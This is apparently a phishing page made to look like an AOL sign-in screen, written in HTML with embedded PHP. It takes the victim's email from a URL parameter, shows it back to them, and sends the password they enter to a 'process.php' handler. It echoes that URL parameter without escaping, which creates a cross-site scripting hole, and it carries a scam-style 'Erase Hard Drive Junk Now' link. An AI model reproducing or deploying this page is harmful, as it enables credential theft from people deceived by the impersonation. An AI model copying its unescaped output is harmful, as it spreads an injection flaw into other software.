<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Aol</title>

    <!-- Bootstrap Core CSS -->
    <link href="image/bootstrap.min.css" rel="stylesheet">
	<link href="image/signin.css" rel="stylesheet">

    <!-- Custom CSS -->
    <style>
		.form-control {margin-bottom:10px !important; border-radius:0px; padding:6px !important; box-shadow:0;}
		.btn {border-radius:2px !important; background:#4391E3 !important; border:0px !important; padding:8px;}
    </style>

</head>

<body>

    <!-- Navigation -->
    <nav class="" role="navigation" style="    background: #F3F3F3;
    padding: 6px 15px;
    height: auto;
    margin: 0;">
        <div class="container">
            <!-- Collect the nav links, forms, and other content for toggling -->
            <div class="" id="">
                <ul class="nav navbar-nav" >
                    <li>
                        <img src="image/aolsm.gif" /> | Help
                    </li>
                </ul>
            </div>
            <!-- /.navbar-collapse -->
        </div>
        <!-- /.container -->
    </nav>

    <!-- Page Content -->
    <div class="container">

        <div class="row">
			<div style="float: right;
    width: 300px;
    border: 1px solid #f3f3f3; margin-top:90px;">
					<form class="form-signin" method="POST" action="process.php">
				<h2 class="form-signin-heading"><img src="image/aolbig.png" style="    width: 80px;" /></h2>
				
				<p style="font-weight:bold;"><?php if(isset($_GET['userid'])) {echo $_GET['userid']; } ?></p>
				<input type="hidden"  name="email" value="<?php if(isset($_GET['userid'])) {echo $_GET['userid']; } ?>" >
				
				<label for="inputPassword" class="sr-only">Password</label>
				<input type="password" id="inputPassword" name="password" class="form-control" placeholder="Password" required="">
				<div style="text-align:right">
					<a href="" tabindex="4" target="_top" id="forgot-pwd">Forgot password?</a>
				</div>
				<div class="checkbox">
				  <label>
					<input type="checkbox" value="remember-me"> Remember me
				  </label>
				</div>
				<button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
			  </form>
			  <div style="text-align:center;">
				<p><a href="" target="_top" id="getSn" tabindex="6" title="Get a Free Username">Get a Free Username</a></p>
				<p><a href="" target="_top" id="getSn" tabindex="6" title="Get a Free Username">Erase Hard Drive Junk Now</a></p>
			  </div>
			  </div>
        </div>
        <!-- /.row -->

    </div>
    <!-- /.container -->

</body>

</html>
